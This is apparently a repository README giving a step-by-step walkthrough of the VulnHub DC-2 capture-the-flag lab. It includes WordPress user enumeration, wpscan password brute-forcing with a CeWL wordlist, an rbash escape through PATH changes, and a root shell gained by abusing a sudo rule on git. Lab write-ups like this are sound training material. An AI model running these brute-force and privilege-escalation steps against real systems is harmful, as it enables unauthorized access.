# 🚩 DC-2 — VulnHub CTF Walkthrough

> **From WordPress to Root** — A complete penetration testing walkthrough of the DC-2 Capture The Flag challenge.

---

## 📋 Overview

**DC-2** is a beginner-friendly CTF challenge from [VulnHub](https://www.vulnhub.com/) designed to test penetration testing skills across multiple domains — **web exploitation**, **password cracking**, **restricted shell escaping**, and **privilege escalation**.

| Detail       | Info                                  |
|--------------|---------------------------------------|
| **Platform** | VulnHub                               |
| **Difficulty** | Beginner / Intermediate             |
| **Goal**     | Capture all flags and gain root access |
| **Attack Vector** | WordPress → SSH → rbash escape → Privilege Escalation |

---

## 🛠️ Tools Used

| Tool            | Purpose                            |
|-----------------|-------------------------------------|
| `netdiscover`   | Network host discovery              |
| `nmap`          | Port and service scanning           |
| `cewl`          | Custom wordlist generation          |
| `wpscan`        | WordPress enumeration & brute force |
| `nikto`         | Web vulnerability scanner           |
| `ssh`           | Remote shell access                 |
| `sudo`          | Privilege escalation analysis       |

---

## 🗺️ Attack Path

```
Network Discovery ➜ Port Scan ➜ WordPress Enumeration ➜ Custom Wordlist (CeWL)
    ➜ Password Brute Force ➜ SSH Access (port 7744) ➜ Restricted Shell Escape
        ➜ User Pivot (su) ➜ sudo git Privilege Escalation ➜ Root 🏆
```

---

## 📖 Walkthrough

### Phase 1 — Reconnaissance

1. **Network Discovery** — Identified the target machine using `netdiscover -r 192.168.1.0/24`.
2. **Port Scanning** — Ran `nmap -sV <target-ip>` to discover open services:
   - **Port 80** — Apache httpd (WordPress)
   - **Port 7744** — SSH (non-standard port)
3. **Hosts File** — Added the target IP to `/etc/hosts` mapping to `dc-2` for virtual host resolution.

### Phase 2 — WordPress Enumeration

- Discovered **Flag 1** on the WordPress site, hinting at using **CeWL** for wordlist generation.
- Enumerated WordPress users with WPScan → found: `admin`, `jerry`, `tom`.
- Generated a custom wordlist from the site content using CeWL:
  ```bash
  cewl http://dc-2/ -w dc-2-passwords.txt
  ```

### Phase 3 — Credential Cracking

- Brute-forced WordPress logins with WPScan using the custom wordlist:
  ```bash
  wpscan --url http://dc-2/ --usernames users.txt --passwords dc-2-passwords.txt
  ```
- Successfully cracked passwords for **jerry** and **tom**.

### Phase 4 — Shell Access & rbash Escape

- Connected via SSH on the non-standard port:
  ```bash
  ssh tom@<target-ip> -p 7744
  ```
- Encountered a **restricted bash shell (rbash)** — escaped it with PATH manipulation:
  ```bash
  export PATH=/bin:/usr/bin:$PATH
  export SHELL=/bin/bash:$SHELL
  ```
- Retrieved **Flag 3** which hinted at switching users.

### Phase 5 — Privilege Escalation

- Switched to `jerry` using `su jerry`.
- Checked sudo permissions with `sudo -l`:
  ```
  (root) NOPASSWD: /usr/bin/git
  ```
- Exploited `git` to spawn a root shell:
  ```bash
  sudo git -p help config
  # Inside the pager:
  !bash
  ```
- **Root shell obtained! 🎉**

### Phase 6 — Final Flag

- Navigated to `/root` and captured the **final flag**.

---

## 🔑 Key Takeaways

| # | Lesson |
|---|--------|
| 1 | **Custom wordlists** (CeWL) often work better than default ones |
| 2 | **Always scan for non-standard ports** — SSH wasn't on port 22 |
| 3 | **Restricted shells (rbash) can be bypassed** via PATH manipulation |
| 4 | **Sudo misconfigurations are dangerous** — even `git` can escalate to root |

---

## 📸 Screenshots

The full walkthrough with annotated screenshots is available in [`DC2_CTF_Walkthrough.md`](DC2_CTF_Walkthrough.md).

---

## 📂 Repository Structure

```
DC2/
├── README.md                  # This file
├── DC2_CTF_Walkthrough.md     # Detailed walkthrough with screenshot references
├── process.txt                # Raw notes taken during the CTF
└── Screenshot_*.png           # Step-by-step screenshots from the challenge
```

---

## ⚠️ Disclaimer

This walkthrough is for **educational purposes only**. The techniques demonstrated were performed in a controlled, legal lab environment. Always obtain proper authorization before testing systems you do not own.

---

## 📬 Connect

If you found this helpful or have questions, feel free to open an issue or reach out!

**Tags:** `#CTF` `#VulnHub` `#PenetrationTesting` `#CyberSecurity` `#WordPress` `#PrivilegeEscalation` `#InfoSec`
